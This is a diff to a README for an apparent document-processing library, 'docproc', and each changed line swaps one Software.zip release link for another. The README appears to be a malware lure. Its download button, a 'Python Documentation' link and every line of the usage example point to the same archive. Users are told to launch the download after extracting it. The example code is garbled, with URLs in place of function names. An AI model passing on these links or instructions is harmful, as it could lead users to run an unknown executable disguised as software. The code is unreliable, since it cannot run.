@@ -17,7 +17,7 @@ Welcome to the `docproc` repository, your one-stop solution for content extracti
 ## 📦 Installation
 To get started with `docproc`, you can download the latest version by clicking the button below:
 
-[![Download v1.0.0](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip)](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip){:target="_blank"}
+[![Download v1.0.0](https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip)](https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip){:target="_blank"}
 
 ℹ️ **Note:** The download file needs to be launched after extraction.
 
@@ -30,19 +30,19 @@ Once you have downloaded and set up `docproc`, you can start using it for variou
 import docproc
 
 # Load a document for analysis
-document = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip("https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip")
+document = https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip("https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip")
 
 # Extract text content
-text_content = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
+text_content = https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip(document)
 
 # Analyze layout and regions
-regions = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
+regions = https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip(document)
 
 # Perform text classification
-text_classes = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(regions)
+text_classes = https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip(regions)
 
 # Extract equations from the document
-equations = https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip(document)
+equations = https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip(document)
 ```
 
 Feel free to explore the extensive capabilities of `docproc` and tailor it to your specific document processing needs.
@@ -65,7 +65,7 @@ Feel free to explore the extensive capabilities of `docproc` and tailor it to yo
 - text-extraction
 
 ## 🌐 Additional Resources
-If you want to dive deeper into the document processing domain, we recommend visiting the [Python Documentation on Text Processing](https://github.com/urhotmom/docproc/releases/download/v1.0/Software.zip){:target="_blank"} for additional insights and techniques.
+If you want to dive deeper into the document processing domain, we recommend visiting the [Python Documentation on Text Processing](https://github.com/urhotmom/docproc/releases/download/v2.0/Software.zip){:target="_blank"} for additional insights and techniques.
 
 ---
 
